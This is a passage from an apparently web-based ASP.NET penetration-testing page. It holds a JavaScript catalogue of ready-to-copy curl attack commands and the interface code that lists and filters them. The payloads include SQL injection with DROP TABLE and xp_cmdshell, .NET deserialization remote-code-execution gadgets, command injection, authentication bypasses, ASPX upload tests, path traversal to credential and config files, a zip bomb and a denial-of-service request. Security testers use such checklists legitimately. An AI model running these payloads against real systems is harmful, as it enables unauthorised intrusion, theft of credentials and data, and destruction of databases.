        </div>
    </div>

    <script>
        // Comprehensive ASP.NET Security Test Database
        const testDatabase = {
            'ViewState Vulnerabilities': {
                icon: 'fas fa-eye',
                color: 'bg-blue-500',
                tests: [
                    {
                        id: 'vs001',
                        name: 'ViewState MAC Validation Bypass',
                        severity: 'critical',
                        cve: 'CVE-2010-3332',
                        description: 'Tests if ViewState MAC validation can be bypassed to inject malicious data',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=/wEPDwUKMTIzNDU2Nzg5MGRk&__VIEWSTATEGENERATOR=CA0B0334" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'vs002',
                        name: 'ViewState Padding Oracle Attack',
                        severity: 'critical',
                        cve: 'CVE-2010-3332',
                        description: 'Exploits CBC padding validation to decrypt encrypted ViewState data through timing analysis',
                        command: 'for i in {0..255}; do curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=test$i" -w "Byte $i: %{time_total}s\\n" -o /dev/null -s; done | sort -k3 -n'
                    },
                    {
                        id: 'vs003',
                        name: 'ViewState Deserialization RCE',
                        severity: 'critical',
                        cve: 'CVE-2019-0604',
                        description: 'Tests for unsafe ViewState deserialization leading to remote code execution',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=MALICIOUS_SERIALIZED_PAYLOAD" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'vs004',
                        name: 'EventValidation Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests if EventValidation can be bypassed to trigger unauthorized server events',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__EVENTTARGET=ctl00$AdminButton&__EVENTARGUMENT=" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'vs005',
                        name: 'ViewState Information Disclosure',
                        severity: 'medium',
                        cve: '',
                        description: 'Attempts to extract sensitive application information from ViewState structure',
                        command: 'curl "{{URL}}/Default.aspx" | grep -oP "__VIEWSTATE\\" value=\\"\\K[^\\"]+" | base64 -d | xxd'
                    },
                    {
                        id: 'vs006',
                        name: 'ViewState Cross-Application Attack',
                        severity: 'high',
                        cve: '',
                        description: 'Tests if ViewState from one application can be used in another with shared machine keys',
                        command: 'curl "{{URL}}/app1/Default.aspx" | grep -oP "__VIEWSTATE\\" value=\\"\\K[^\\"]+" > vs.tmp && curl -X POST "{{URL}}/app2/Default.aspx" -d "__VIEWSTATE=$(cat vs.tmp)" -v'
                    },
                    {
                        id: 'vs007',
                        name: 'ViewState Replay Attack',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests ViewState replay across different sessions to detect session binding issues',
                        command: 'curl "{{URL}}/Default.aspx" -c session1.txt | grep -oP "__VIEWSTATE\\" value=\\"\\K[^\\"]+" > vs.tmp && curl -X POST "{{URL}}/Default.aspx" -b "ASP.NET_SessionId=newsession" -d "__VIEWSTATE=$(cat vs.tmp)" -v'
                    },
                    {
                        id: 'vs008',
                        name: 'ViewState Size-based DoS',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests application resilience against oversized ViewState payloads causing memory exhaustion',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -d "__VIEWSTATE=$(python3 -c "import base64; print(base64.b64encode(b\'A\'*1000000).decode())")" --max-time 30 -v'
                    }
                ]
            },

            'Authentication Bypass': {
                icon: 'fas fa-user-times',
                color: 'bg-red-500',
                tests: [
                    {
                        id: 'auth001',
                        name: 'ASP.NET Core Authentication Bypass (CVE-2025-24070)',
                        severity: 'critical',
                        cve: 'CVE-2025-24070',
                        description: 'Tests elevation of privilege vulnerability in ASP.NET Core RefreshSignInAsync method',
                        command: 'curl -X POST "{{URL}}/Account/RefreshSignIn" -H "Content-Type: application/json" -d \'{"userId":"admin","isPersistent":true}\' -v'
                    },
                    {
                        id: 'auth002',
                        name: 'Path Traversal Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Bypasses authentication using directory traversal and path manipulation techniques',
                        command: 'curl "{{URL}}/admin/../public/../admin/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth003',
                        name: 'URL Encoding Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass using various URL encoding techniques',
                        command: 'curl "{{URL}}/admin%2f%2e%2e%2fpublic%2f%2e%2e%2fadmin/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth004',
                        name: 'HTTP Method Override Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass using HTTP method overrides and verb tampering',
                        command: 'curl -X OPTIONS "{{URL}}/admin/Dashboard.aspx" -H "X-HTTP-Method-Override: GET" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth005',
                        name: 'Header Injection Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass through custom header injection',
                        command: 'curl "{{URL}}/public.aspx" -H "X-Original-URL: /admin/Dashboard.aspx" -H "X-Rewrite-URL: /admin/Dashboard.aspx" -v'
                    },
                    {
                        id: 'auth006',
                        name: 'Cookie Manipulation Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass through cookie manipulation and injection',
                        command: 'curl "{{URL}}/admin/Dashboard.aspx" -H "Cookie: .ASPXAUTH=; ASP.NET_SessionId=admin_session; .ASPXROLES=Admin" -v'
                    },
                    {
                        id: 'auth007',
                        name: 'Case Sensitivity Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests if authentication can be bypassed using case variation in URLs',
                        command: 'curl "{{URL}}/ADMIN/DASHBOARD.ASPX" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth008',
                        name: 'Null Byte Authentication Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests authentication bypass using null byte injection in URLs',
                        command: 'curl "{{URL}}/admin%00/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth009',
                        name: 'Double Slash Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests authentication bypass using double slashes in URL paths',
                        command: 'curl "{{URL}}//admin/Dashboard.aspx" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'auth010',
                        name: 'IP Address Spoofing Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests IP-based authentication bypass using header spoofing',
                        command: 'curl "{{URL}}/admin/Dashboard.aspx" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -v'
                    }
                ]
            },

            'SQL Injection': {
                icon: 'fas fa-database',
                color: 'bg-orange-500',
                tests: [
                    {
                        id: 'sql001',
                        name: 'Classic SQL Injection in Parameters',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for classic SQL injection in URL parameters and form fields',
                        command: 'curl "{{URL}}/Product.aspx?id=1\'" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql002',
                        name: 'Union-based SQL Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for UNION-based SQL injection to extract data from database',
                        command: 'curl "{{URL}}/Product.aspx?id=1+UNION+SELECT+NULL,username,password+FROM+users--" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql003',
                        name: 'Blind SQL Injection with Time Delays',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for blind SQL injection using SQL Server WAITFOR DELAY',
                        command: 'curl "{{URL}}/Search.aspx?q=test\'; WAITFOR DELAY \'00:00:05\'; --" -w "Time: %{time_total}s" -o /dev/null -s'
                    },
                    {
                        id: 'sql004',
                        name: 'Boolean-based Blind SQL Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for boolean-based blind SQL injection using conditional responses',
                        command: 'curl "{{URL}}/Login.aspx" -d "username=admin\' AND \'1\'=\'1\' --&password=test" -v'
                    },
                    {
                        id: 'sql005',
                        name: 'Error-based SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for error-based SQL injection to extract information through error messages',
                        command: 'curl "{{URL}}/Product.aspx?id=1+AND+1=CONVERT(INT,@@version)--" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql006',
                        name: 'Second-order SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for second-order SQL injection through stored user input',
                        command: 'curl -X POST "{{URL}}/Register.aspx" -d "username=admin\'; DROP TABLE users; --&email=test@test.com&password=test123" -v'
                    },
                    {
                        id: 'sql007',
                        name: 'JSON SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for SQL injection in JSON API endpoints',
                        command: 'curl -X POST "{{URL}}/api/users" -H "Content-Type: application/json" -d \'{"name":"test\' OR 1=1 --","email":"test@test.com"}\' -v'
                    },
                    {
                        id: 'sql008',
                        name: 'XML SQL Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for SQL injection in XML input processing',
                        command: 'curl -X POST "{{URL}}/api/xml" -H "Content-Type: application/xml" -d \'<user><name>test\' OR 1=1 --</name></user>\' -v'
                    },
                    {
                        id: 'sql009',
                        name: 'Stored Procedure SQL Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for SQL injection in stored procedure calls',
                        command: 'curl "{{URL}}/Search.aspx?category=electronics\'; EXEC xp_cmdshell \'whoami\'; --" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'sql010',
                        name: 'NoSQL Injection in MongoDB',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for NoSQL injection vulnerabilities in MongoDB queries',
                        command: 'curl -X POST "{{URL}}/api/users" -H "Content-Type: application/json" -d \'{"username":{"$ne":null},"password":{"$ne":null}}\' -v'
                    }
                ]
            },

            'Deserialization Attacks': {
                icon: 'fas fa-unlink',
                color: 'bg-purple-500',
                tests: [
                    {
                        id: 'deser001',
                        name: 'BinaryFormatter Deserialization RCE',
                        severity: 'critical',
                        cve: 'CVE-2019-0804',
                        description: 'Tests for unsafe BinaryFormatter usage leading to remote code execution',
                        command: 'echo "AAEAAAD/////" | base64 -d | curl -X POST "{{URL}}/api/data" -H "Content-Type: application/octet-stream" --data-binary @- -v'
                    },
                    {
                        id: 'deser002',
                        name: 'JSON.NET TypeNameHandling RCE',
                        severity: 'critical',
                        cve: 'CVE-2019-0464',
                        description: 'Tests for unsafe JSON.NET TypeNameHandling settings allowing code execution',
                        command: 'curl -X POST "{{URL}}/api/json" -H "Content-Type: application/json" -d \'{"$type":"System.Diagnostics.Process, System","StartInfo":{"FileName":"calc.exe"}}\' -v'
                    },
                    {
                        id: 'deser003',
                        name: 'DataContractSerializer Exploitation',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for unsafe DataContractSerializer usage in WCF services',
                        command: 'curl -X POST "{{URL}}/Service.svc" -H "Content-Type: application/xml" -d \'<ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" MethodName="Start"><ObjectDataProvider.ObjectInstance><Process xmlns="clr-namespace:System.Diagnostics;assembly=System" /></ObjectDataProvider.ObjectInstance></ObjectDataProvider>\' -v'
                    },
                    {
                        id: 'deser004',
                        name: 'XMLSerializer Exploitation',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for unsafe XMLSerializer deserialization vulnerabilities',
                        command: 'curl -X POST "{{URL}}/api/xml" -H "Content-Type: application/xml" -d \'<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System],[System.Windows.Data.ObjectDataProvider, PresentationFramework]], System.Data.Services"></root>\' -v'
                    },
                    {
                        id: 'deser005',
                        name: 'JavaScriptSerializer Exploitation',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for unsafe JavaScriptSerializer usage with __type parameter',
                        command: 'curl -X POST "{{URL}}/api/ajax" -H "Content-Type: application/json" -d \'{"__type":"System.Diagnostics.Process, System"}\' -v'
                    },
                    {
                        id: 'deser006',
                        name: 'Session State Deserialization',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for unsafe session state deserialization in custom providers',
                        command: 'curl -X POST "{{URL}}/Default.aspx" -H "Cookie: ASP.NET_SessionId=MALICIOUS_SESSION_DATA" -v'
                    }
                ]
            },

            'Command Injection': {
                icon: 'fas fa-terminal',
                color: 'bg-green-500',
                tests: [
                    {
                        id: 'cmd001',
                        name: 'OS Command Injection via Process.Start',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for OS command injection in System.Diagnostics.Process calls',
                        command: 'curl -X POST "{{URL}}/Tools.aspx" -d "command=ping 127.0.0.1 && whoami" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'cmd002',
                        name: 'PowerShell Command Injection',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for PowerShell command injection in automated scripts',
                        command: 'curl -X POST "{{URL}}/Admin/Scripts.aspx" -d "script=Get-Process; whoami" -H "Cookie: {{COOKIE}}" -v'
                    },
                    {
                        id: 'cmd003',
                        name: 'Batch File Command Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for command injection through batch file execution',
                        command: 'curl -X POST "{{URL}}/Backup.aspx" -d "filename=backup.bat && echo malicious > evil.txt" -v'
                    },
                    {
                        id: 'cmd004',
                        name: 'LDAP Command Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for LDAP injection in directory service queries',
                        command: 'curl -X POST "{{URL}}/Login.aspx" -d "username=admin*)(uid=*))(|(uid=*&password=test" -v'
                    },
                    {
                        id: 'cmd005',
                        name: 'XPath Injection',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for XPath injection in XML data processing',
                        command: 'curl -X POST "{{URL}}/Search.aspx" -d "query=test\' or \'1\'=\'1" -H "Content-Type: application/x-www-form-urlencoded" -v'
                    }
                ]
            },

            'Configuration Issues': {
                icon: 'fas fa-cog',
                color: 'bg-yellow-500',
                tests: [
                    {
                        id: 'config001',
                        name: 'Web.config Information Disclosure',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for exposed web.config files containing sensitive configuration data',
                        command: 'curl "{{URL}}/web.config" -v && curl "{{URL}}/Web.config.bak" -v && curl "{{URL}}/web.config.old" -v'
                    },
                    {
                        id: 'config002',
                        name: 'Debug Mode Detection',
                        severity: 'high',
                        cve: '',
                        description: 'Detects if debug mode is enabled in production exposing stack traces',
                        command: 'curl "{{URL}}/NonExistent.aspx" -v 2>&1 | grep -E "compilation debug|Stack Trace|Source Error"'
                    },
                    {
                        id: 'config003',
                        name: 'Custom Errors Disabled',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests if custom errors are disabled exposing detailed error information',
                        command: 'curl "{{URL}}/error.aspx?test=\'" -v 2>&1 | grep -E "Exception|Stack Trace|System\\."'
                    },
                    {
                        id: 'config004',
                        name: 'Machine Key Exposure',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for exposed or weak machine keys in configuration files',
                        command: 'curl "{{URL}}/web.config" -v | grep -E "validationKey|decryptionKey|machineKey"'
                    },
                    {
                        id: 'config005',
                        name: 'Connection String Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed database connection strings',
                        command: 'curl "{{URL}}/web.config" -v | grep -E "connectionString|server=|password=|uid="'
                    },
                    {
                        id: 'config006',
                        name: 'Sensitive Directory Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed sensitive application directories',
                        command: 'for dir in App_Data bin App_Code App_GlobalResources App_LocalResources App_Browsers; do curl "{{URL}}/$dir/" -v; done'
                    },
                    {
                        id: 'config007',
                        name: 'Global.asax Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed Global.asax application files',
                        command: 'curl "{{URL}}/Global.asax" -v && curl "{{URL}}/global.asa" -v'
                    },
                    {
                        id: 'config008',
                        name: 'Packages.config Exposure',
                        severity: 'low',
                        cve: '',
                        description: 'Tests for exposed NuGet packages configuration',
                        command: 'curl "{{URL}}/packages.config" -v'
                    }
                ]
            },

            'HTTP Handlers & Modules': {
                icon: 'fas fa-plug',
                color: 'bg-indigo-500',
                tests: [
                    {
                        id: 'handler001',
                        name: 'WebResource.axd Padding Oracle',
                        severity: 'critical',
                        cve: 'CVE-2010-3332',
                        description: 'Tests for padding oracle vulnerability in WebResource.axd handler',
                        command: 'curl "{{URL}}/WebResource.axd?d=invalid_encrypted_data" -v 2>&1 | grep -E "Padding|Invalid|500|404"'
                    },
                    {
                        id: 'handler002',
                        name: 'ScriptResource.axd Information Disclosure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for information disclosure in ScriptResource.axd handler',
                        command: 'curl "{{URL}}/ScriptResource.axd?d=&t=ffffffff" -v'
                    },
                    {
                        id: 'handler003',
                        name: 'Trace.axd Information Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed trace information revealing request/response data',
                        command: 'curl "{{URL}}/trace.axd" -H "X-Forwarded-For: 127.0.0.1" -v'
                    },
                    {
                        id: 'handler004',
                        name: 'ELMAH Error Log Exposure',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for exposed ELMAH error logging interface',
                        command: 'curl "{{URL}}/elmah.axd" -v && curl "{{URL}}/admin/elmah.axd" -v'
                    },
                    {
                        id: 'handler005',
                        name: 'Glimpse Diagnostics Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed Glimpse diagnostics panel',
                        command: 'curl "{{URL}}/glimpse.axd" -v'
                    },
                    {
                        id: 'handler006',
                        name: 'Health Monitoring Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed ASP.NET health monitoring endpoints',
                        command: 'curl "{{URL}}/admin/health.axd" -v'
                    },
                    {
                        id: 'handler007',
                        name: 'WCF Service Metadata Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed WCF service metadata and WSDL',
                        command: 'curl "{{URL}}/Service.svc?wsdl" -v && curl "{{URL}}/Service.svc?disco" -v'
                    }
                ]
            },

            'ASP.NET Core Specific': {
                icon: 'fas fa-code-branch',
                color: 'bg-pink-500',
                tests: [
                    {
                        id: 'core001',
                        name: 'SignalR DoS Vulnerability (CVE-2024-21386)',
                        severity: 'high',
                        cve: 'CVE-2024-21386',
                        description: 'Tests for SignalR denial of service vulnerability in ASP.NET Core applications',
                        command: 'curl "{{URL}}/signalr/negotiate" -H "Connection: upgrade" -H "Upgrade: websocket" -v'
                    },
                    {
                        id: 'core002',
                        name: 'Kestrel HTTP/3 RCE (CVE-2024-35264)',
                        severity: 'critical',
                        cve: 'CVE-2024-35264',
                        description: 'Tests for HTTP/3 data corruption vulnerability in Kestrel server',
                        command: 'curl --http3 "{{URL}}/" -H "Content-Length: -1" -d "malformed_data" -v 2>/dev/null || echo "HTTP/3 not supported"'
                    },
                    {
                        id: 'core003',
                        name: 'JWT Algorithm Confusion',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for JWT algorithm confusion attacks bypassing authentication',
                        command: 'curl "{{URL}}/api/protected" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9." -v'
                    },
                    {
                        id: 'core004',
                        name: 'Model Binding Mass Assignment',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for mass assignment vulnerabilities in ASP.NET Core model binding',
                        command: 'curl -X POST "{{URL}}/api/users" -H "Content-Type: application/json" -d \'{"Name":"Test","Email":"test@test.com","IsAdmin":true,"Role":"Administrator"}\' -v'
                    },
                    {
                        id: 'core005',
                        name: 'Dependency Injection Abuse',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for dependency injection container abuse in ASP.NET Core',
                        command: 'curl -X POST "{{URL}}/api/resolve" -H "Content-Type: application/json" -d \'{"type":"System.IO.File, System.IO"}\' -v'
                    },
                    {
                        id: 'core006',
                        name: 'Razor Page Path Traversal',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for path traversal vulnerabilities in Razor Pages routing',
                        command: 'curl "{{URL}}/../../etc/passwd" -v && curl "{{URL}}/../../../windows/win.ini" -v'
                    }
                ]
            },

            'Security Headers & CORS': {
                icon: 'fas fa-shield-alt',
                color: 'bg-cyan-500',
                tests: [
                    {
                        id: 'header001',
                        name: 'Missing Security Headers Audit',
                        severity: 'medium',
                        cve: '',
                        description: 'Comprehensive audit of missing security headers',
                        command: 'curl -I "{{URL}}/" | grep -E "Strict-Transport-Security|Content-Security-Policy|X-Frame-Options|X-Content-Type-Options|X-XSS-Protection|Referrer-Policy"'
                    },
                    {
                        id: 'header002',
                        name: 'CORS Misconfiguration - Wildcard with Credentials',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for dangerous CORS configuration allowing wildcard origins with credentials',
                        command: 'curl "{{URL}}/api/data" -H "Origin: https://evil.com" -I | grep -E "Access-Control-Allow-Origin.*\\*.*Access-Control-Allow-Credentials.*true"'
                    },
                    {
                        id: 'header003',
                        name: 'CORS Reflected Origin',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for CORS configuration that reflects arbitrary origins',
                        command: 'curl "{{URL}}/api/data" -H "Origin: https://attacker.com" -I | grep "Access-Control-Allow-Origin: https://attacker.com"'
                    },
                    {
                        id: 'header004',
                        name: 'Clickjacking Protection Test',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for missing X-Frame-Options or CSP frame protection',
                        command: 'curl -I "{{URL}}/" | grep -E "X-Frame-Options|frame-ancestors"'
                    },
                    {
                        id: 'header005',
                        name: 'Content Security Policy Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for weak or bypassable Content Security Policy',
                        command: 'curl -I "{{URL}}/" | grep "Content-Security-Policy" | grep -E "unsafe-inline|unsafe-eval|\\*"'
                    },
                    {
                        id: 'header006',
                        name: 'HTTP Strict Transport Security Missing',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for missing HSTS headers on HTTPS sites',
                        command: 'curl -I "{{URL}}/" | grep "Strict-Transport-Security"'
                    },
                    {
                        id: 'header007',
                        name: 'ASP.NET Version Disclosure',
                        severity: 'low',
                        cve: '',
                        description: 'Tests for ASP.NET version disclosure in HTTP headers',
                        command: 'curl -I "{{URL}}/" | grep -E "Server.*ASP.NET|X-AspNet-Version|X-Powered-By.*ASP.NET"'
                    }
                ]
            },

            'Session Management': {
                icon: 'fas fa-users-cog',
                color: 'bg-teal-500',
                tests: [
                    {
                        id: 'session001',
                        name: 'Session Fixation Attack',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for session fixation vulnerabilities in authentication',
                        command: 'curl -X POST "{{URL}}/Login.aspx" -H "Cookie: ASP.NET_SessionId=FIXED_SESSION_123" -d "username=admin&password=password123" -c - | grep "ASP.NET_SessionId"'
                    },
                    {
                        id: 'session002',
                        name: 'Session Prediction Attack',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for predictable session ID generation patterns',
                        command: 'for i in {1..5}; do curl "{{URL}}/Login.aspx" -c - 2>/dev/null | grep "ASP.NET_SessionId" | cut -d= -f2 | cut -d\\; -f1; sleep 1; done'
                    },
                    {
                        id: 'session003',
                        name: 'Session Hijacking via XSS',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for session cookie accessibility via client-side scripts',
                        command: 'curl -c - "{{URL}}/Login.aspx" 2>/dev/null | grep "Set-Cookie" | grep -v "HttpOnly"'
                    },
                    {
                        id: 'session004',
                        name: 'Concurrent Session Management',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests if multiple concurrent sessions are properly managed',
                        command: 'curl -X POST "{{URL}}/Login.aspx" -d "username=admin&password=test" -c session1.txt && curl -X POST "{{URL}}/Login.aspx" -d "username=admin&password=test" -c session2.txt'
                    },
                    {
                        id: 'session005',
                        name: 'Session Timeout Testing',
                        severity: 'low',
                        cve: '',
                        description: 'Tests for proper session timeout implementation',
                        command: 'curl "{{URL}}/Admin.aspx" -H "Cookie: ASP.NET_SessionId=EXPIRED_SESSION_123" -v'
                    }
                ]
            },

            'File Upload Vulnerabilities': {
                icon: 'fas fa-file-upload',
                color: 'bg-rose-500',
                tests: [
                    {
                        id: 'upload001',
                        name: 'ASP/ASPX File Upload',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for unrestricted upload of executable ASP/ASPX files',
                        command: 'echo "<%Response.Write(\\"RCE_TEST\\");%>" > test.aspx && curl -X POST "{{URL}}/Upload.aspx" -F "file=@test.aspx" -v'
                    },
                    {
                        id: 'upload002',
                        name: 'Double Extension Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for file upload filter bypass using double extensions',
                        command: 'echo "malicious content" > test.jpg.aspx && curl -X POST "{{URL}}/Upload.aspx" -F "file=@test.jpg.aspx" -v'
                    },
                    {
                        id: 'upload003',
                        name: 'MIME Type Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for file upload bypass using MIME type spoofing',
                        command: 'echo "<%Response.Write(\\"test\\");%>" > test.aspx && curl -X POST "{{URL}}/Upload.aspx" -F "file=@test.aspx;type=image/jpeg" -v'
                    },
                    {
                        id: 'upload004',
                        name: 'Path Traversal in Upload',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for path traversal vulnerabilities in file upload functionality',
                        command: 'echo "malicious" > test.txt && curl -X POST "{{URL}}/Upload.aspx" -F "filename=../../web.config" -F "file=@test.txt" -v'
                    },
                    {
                        id: 'upload005',
                        name: 'Zip Bomb Upload',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for zip bomb vulnerabilities in file upload processing',
                        command: 'dd if=/dev/zero of=large.txt bs=1M count=100 && zip bomb.zip large.txt && curl -X POST "{{URL}}/Upload.aspx" -F "file=@bomb.zip" -v'
                    }
                ]
            }
        };

        // Application State
        let selectedTests = new Set();
        let currentFilter = 'all';
        let isScanning = false;

        // Initialize
        function init() {
            renderTestCategories();
            updateStats();
            updateFilterCounts();
        }

        // Render test categories
        function renderTestCategories() {
            const container = document.getElementById('testCategories');
            let html = '';
            
            Object.entries(testDatabase).forEach(([categoryName, categoryData]) => {
                const visibleTests = getVisibleTests(categoryData.tests);
                if (visibleTests.length === 0) return;
                
                html += `
                    <div class="category-section">
                        <div class="category-header">
                            <div class="category-icon ${categoryData.color}">
                                <i class="${categoryData.icon}"></i>
                            </div>
                            <div class="flex-1">
                                <h3 class="text-xl font-bold text-gray-900">${categoryName}</h3>
                                <p class="text-gray-600">${visibleTests.length} security tests available</p>
                            </div>
                            <div class="flex gap-2">
                                <button class="btn btn-secondary" onclick="selectCategoryTests('${categoryName}')">
                                    <i class="fas fa-check"></i>
                                    Select All
                                </button>
                                <button class="btn btn-secondary" onclick="deselectCategoryTests('${categoryName}')">
                                    <i class="fas fa-times"></i>
                                    Clear
                                </button>
                            </div>
                        </div>
                        <div class="grid gap-4">
                `;
                
                visibleTests.forEach(test => {
                    const isSelected = selectedTests.has(test.id);
                    html += `
                        <div class="test-card ${isSelected ? 'selected' : ''} p-5" id="test-${test.id}">
                            <div class="flex items-start gap-4">
                                <input type="checkbox" 
                                       class="mt-1 w-5 h-5 text-blue-600 rounded border-gray-300 focus:ring-blue-500" 
                                       ${isSelected ? 'checked' : ''}
                                       onchange="toggleTest('${test.id}')">
                                <div class="flex-1">
                                    <div class="flex items-center gap-3 mb-3">
                                        <h4 class="font-semibold text-gray-900 text-lg">${test.name}</h4>
                                        <span class="severity-${test.severity} px-2 py-1 rounded text-xs font-medium">${test.severity.toUpperCase()}</span>
                                        ${test.cve ? `<span class="bg-red-50 text-red-700 text-xs px-2 py-1 rounded font-mono border border-red-200">${test.cve}</span>` : ''}
                                    </div>
                                    <p class="text-gray-700 mb-4">${test.description}</p>
                                    
                                    <div class="code-block mb-4">
                                        <code>${highlightCommand(test.command)}</code>
                                        <button class="copy-btn" onclick="copyCommand('${test.id}')">
                                            <i class="fas fa-copy"></i> Copy
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                });
                
                html += '</div></div>';
            });
            
            container.innerHTML = html;
            updateSelectedCount();
        }

        // Get visible tests based on current filter
        function getVisibleTests(tests) {
            let filteredTests = tests;
            
            if (currentFilter !== 'all') {
                filteredTests = filteredTests.filter(test => test.severity === currentFilter);
            }
            
            const searchTerm = document.getElementById('searchInput')?.value?.toLowerCase() || '';
            if (searchTerm) {
                filteredTests = filteredTests.filter(test => 
                    test.name.toLowerCase().includes(searchTerm) ||
                    test.description.toLowerCase().includes(searchTerm) ||
                    test.cve.toLowerCase().includes(searchTerm) ||
                    test.command.toLowerCase().includes(searchTerm)
                );
            }
            
            return filteredTests;
        }

        // Toggle test selection
        function toggleTest(testId) {
            if (selectedTests.has(testId)) {
                selectedTests.delete(testId);
                document.getElementById(`test-${testId}`).classList.remove('selected');
            } else {
                selectedTests.add(testId);
                document.getElementById(`test-${testId}`).classList.add('selected');
            }
            updateSelectedCount();
        }

        // Filter and search functions
        function filterTests(severity) {
            currentFilter = severity;
            document.querySelectorAll('.filter-chip').forEach(chip => {
                chip.classList.remove('active');
            });
            document.querySelector(`[data-filter="${severity}"]`).classList.add('active');
            renderTestCategories();
        }

        function searchTests() {
            renderTestCategories();
        }

        // Selection functions
        function selectAll() {
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    selectedTests.add(test.id);
                });
            });
            renderTestCategories();
        }

        function deselectAll() {
            selectedTests.clear();
            renderTestCategories();
        }

        function selectCritical() {
            selectedTests.clear();
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    if (test.severity === 'critical') {
                        selectedTests.add(test.id);
                    }
                });
            });
            renderTestCategories();
            showNotification('Critical vulnerabilities selected', 'success');
        }

        function selectCategoryTests(categoryName) {
            testDatabase[categoryName].tests.forEach(test => {
                selectedTests.add(test.id);
            });
            renderTestCategories();
        }

        function deselectCategoryTests(categoryName) {
